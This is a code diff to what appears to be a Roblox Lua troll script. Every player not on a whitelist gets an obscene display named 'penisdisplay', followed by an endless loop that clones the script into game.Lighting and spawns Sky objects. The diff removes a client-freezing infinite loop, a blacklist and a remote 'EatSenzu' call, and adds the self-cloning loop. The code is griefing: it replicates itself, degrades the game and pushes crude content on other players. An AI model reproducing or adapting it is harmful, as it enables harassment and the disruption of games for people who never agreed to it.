@@ -3,10 +3,6 @@ local Whitelist = {
     2597856030,
 }
 
-local Blacklist = {
-    
-}
-
 if not table.find(Whitelist, game:GetService("Players").LocalPlayer.UserId) then
 local penisdisplay = coroutine.create(function()
     game:GetService('RunService').RenderStepped:connect(function()
@@ -17,11 +13,7 @@ local penisdisplay = coroutine.create(function()
     end)
 coroutine.resume(penisdisplay)
 wait(1)
-while true do end
-
-elseif table.find(Blacklist, game:GetService("Players").LocalPlayer.UserId) then
-    while wait() do
-
+while wait() do
 c = script:Clone()
 c.Parent = game.Lighting
 s = Instance.new("Sky")
@@ -69,8 +61,6 @@ end
 end
 end
 end
-wait(20)
-game.Players.LocalPlayer.Backpack.ServerTraits.EatSenzu:FireServer()
 end
 
 coroutine.resume(coroutine.create(function()
